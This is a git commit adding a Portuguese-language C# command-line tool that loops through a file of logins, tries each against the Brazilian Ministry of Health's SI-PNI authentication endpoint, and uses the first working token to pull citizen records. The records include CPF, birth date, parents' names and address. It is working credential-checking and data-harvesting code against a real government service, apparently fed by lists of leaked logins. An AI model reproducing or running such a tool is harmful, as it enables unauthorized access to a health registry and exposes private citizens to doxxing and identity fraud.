5db4601916457a0ae61a79638034ed177ee86345
joaoh <>
2024-10-11 01:54:25 -0300

    Primeiro commit

---
+++ src/Program.cs
@@ -0,0 +1,183 @@
+﻿/*
+ * DESENVOLVIDO POR João H.
+ * Versao do SI-PNI para sistemas sem interface grafica
+ * Ética sempre (:
+*/
+
+using System.Net.Http.Headers;
+using System.Text;
+using System.Text.Encodings.Web;
+using System.Text.Json;
+using System.Web;
+using System.Linq;
+using static CheckerSipni.Models.RespostasModel;
+
+namespace CheckerSipni
+{
+    class Program
+    {
+        static HttpClient Client = new HttpClient();
+        static string ASCIIART = @"
+ ____  _   _ ___ ____ _ _ 
+|  _ \| \ | |_ _/ ___| (_)
+| |_) |  \| || | |   | | |
+|  __/| |\  || | |___| | |
+|_|   |_| \_|___\____|_|_|
+By https://joaoh.netlify.app
+Versao do SI-PNI para sistemas sem interface grafica
+";
+
+        static async Task Main()
+        {
+
+            while (true)
+            {
+                Console.Clear();
+                Console.ForegroundColor = ConsoleColor.Blue;
+                Console.WriteLine(ASCIIART);
+                Console.ResetColor();
+
+                // Isso está ridículo, mas blz kkkk
+                Console.WriteLine("======== MENU ========");
+                Console.WriteLine("1. Consulta por Nome");
+                Console.WriteLine("2. Consulta por CPF");
+                Console.WriteLine("3. Consulta por Telefone");
+                Console.WriteLine("0. Sair");
+                Console.WriteLine("======================");
+                Console.Write("Escolha uma opção: ");
+                var option = int.Parse(Console.ReadLine());
+
+                switch (option)
+                {
+                    case 1:
+                        Console.WriteLine("Nome: ");
+                        var nome = Console.ReadLine();
+                        Console.WriteLine("Codigo Municipio: ");
+                        var codMun = Console.ReadLine();
+                        if (nome != null && codMun != null)
+                        {
+                            await ConsultarEChecar(nome, codMun);
+                            Console.WriteLine("Tecle enter para voltar...");
+                            Console.ReadLine();
+                        }
+                        else
+                        {
+                            Console.WriteLine("Esta faltando coisa ai amigo...");
+                            Console.ReadLine();
+                        }
+                        break;
+                    case 2:
+                        Console.WriteLine("Nao implementado.");
+                        Console.ReadLine();
+                        break;
+                    case 3:
+                        Console.WriteLine("Nao implementado.");
+                        Console.ReadLine();
+                        break;
+                    case 0:
+                        Environment.Exit(0);
+                        break;
+                    default:
+                        Console.WriteLine("Opçao invalida");
+                        Console.ReadLine();
+                        break;
+                }
+            }
+            Console.ResetColor();
+        }
+
+        static async Task ConsultarEChecar(string nome, string codMun)
+        {
+            var loginsFilePath = @".\logins.txt";
+            var lines = File.ReadLines(loginsFilePath);
+
+            foreach (var credential in lines)
+            {
+                var validToken = await CheckLogins(new List<string> { credential });
+
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine($"Testando dados com login {credential}");
+
+                var dados = await Consulta(validToken.ToString(), nome, codMun);
+                if (dados != null && dados.records != null)
+                {
+                    foreach (var dado in dados.records)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.WriteLine("=====================================");
+                        Console.WriteLine($"NOME: {dado.nome ?? "N/A"}");
+                        Console.WriteLine($"CPF: {dado.cpf ?? "N/A"}");
+                        Console.WriteLine($"NASCIMENTO: {dado.dataNascimento ?? "N/A"}");
+                        Console.WriteLine($"MAE: {dado.nomeMae ?? "N/A"}");
+                        Console.WriteLine($"PAI: {dado.nomePai ?? "N/A"}");
+                        Console.WriteLine($"ENDEREÇO: UF = {dado.endereco?.siglaUf ?? "N/A"}, BAIRRO = {dado.endereco?.bairro ?? "N/A"}, NUMERO = {dado.endereco?.numero ?? "N/A"}, CEP = {dado.endereco?.cep ?? "N/A"}, COMPLEMENTO = {dado.endereco?.complemento ?? "N/A"}");
+                        Console.WriteLine("=====================================\n");
+                    }
+
+                    return;
+                }
+                else
+                {
+                    Console.ForegroundColor = ConsoleColor.Yellow;
+                    Console.WriteLine("[!] ATENCAO: Nenhum dado encontrado.\n");
+                    continue;
+                }
+            }
+        }
+
+        static async Task<string> CheckLogins(List<string> credentials)
+        {
+            try
+            {
+                foreach (var credential in credentials)
+                {
+                    Client.DefaultRequestHeaders.Clear();
+                    var loginBytes = Encoding.ASCII.GetBytes(credential);
+                    var encodedLogin = System.Convert.ToBase64String(loginBytes);
+
+                    Client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71");
+                    Client.DefaultRequestHeaders.Add("X-Authorization", $"Basic {encodedLogin}");
+
+                    var response = await Client.PostAsync("https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso", null);
+                    var json = await response.Content.ReadAsStringAsync();
+                    if (response.IsSuccessStatusCode)
+                    {
+                        // pegar accessToken
+                        LoginToken logintoken = JsonSerializer.Deserialize<LoginToken>(json);
+                        return logintoken.accessToken;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] ERRO: {ex.Message}");
+            }
+
+            return string.Empty;
+        }
+
+        // Faz a requisição na API com o token Bearer e retorna a classe com os dados deserializados
+        static async Task<Root> Consulta(string basicToken, string nome, string codMun)
+        {
+            try
+            {
+                Client.DefaultRequestHeaders.Clear();
+                Client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71");
+                Client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", basicToken);
+
+                nome = HttpUtility.UrlEncode(nome);
+
+                var response = await Client.GetAsync($"https://servicos-cloud.saude.gov.br/pni-bff/v1/cidadao?nome={nome}&municipioNascimento={codMun}");
+                var json = await response.Content.ReadAsStringAsync();
+
+                Root root = JsonSerializer.Deserialize<Root>(json);
+                return root;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] ERRO: {ex.Message}");
+                return null;
+            }
+        }
+    }
+}
---
+++ src/RespostasModel.cs
@@ -0,0 +1,78 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace CheckerSipni.Models
+{
+    public class RespostasModel
+    {
+        // O token é gerado apos o login, credenciais devem ser codificadas formato (USER:PASS)
+        // e codificadas em base64 e colocalas no header X-Authorization: Basic XXX==
+        public class LoginToken
+        {
+            public string? accessToken { get; set; }
+            public string? tokenType { get; set; }
+            public string? refreshToken { get; set; }
+            public string? scope { get; set; }
+            public string? organization { get; set; }
+            public string? jti { get; set; }
+        }
+
+        // DADOS RESPOSTA
+        public class Endereco
+        {
+            public int tipoEndereco { get; set; }
+            public string? logradouro { get; set; }
+            public string? numero { get; set; }
+            public string? bairro { get; set; }
+            public string? municipio { get; set; }
+            public string? siglaUf { get; set; }
+            public string? pais { get; set; }
+            public string? cep { get; set; }
+            public string? complemento { get; set; }
+        }
+
+        public class Nacionalidade
+        {
+            public int nacionalidade { get; set; }
+            public string? municipioNascimento { get; set; }
+            public string? paisNascimento { get; set; }
+        }
+
+        public class Record
+        {
+            public string? cnsDefinitivo { get; set; }
+            public List<string>? cnsProvisorio { get; set; }
+            public string? nome { get; set; }
+            public string? cpf { get; set; }
+            public string? dataNascimento { get; set; }
+            public string? sexo { get; set; }
+            public string? nomeMae { get; set; }
+            public string? nomePai { get; set; }
+            public int grauQualidade { get; set; }
+            public bool ativo { get; set; }
+            public bool obito { get; set; }
+            public bool partoGemelar { get; set; }
+            public bool vip { get; set; }
+            public string? racaCor { get; set; }
+            public List<Telefone>? telefone { get; set; }
+            public Nacionalidade? nacionalidade { get; set; }
+            public Endereco? endereco { get; set; }
+        }
+
+        public class Root
+        {
+            public List<Record>? records { get; set; }
+        }
+
+        public class Telefone
+        {
+            public string? ddi { get; set; }
+            public string? ddd { get; set; }
+            public string? numero { get; set; }
+            public int tipo { get; set; }
+        }
+    }
+}
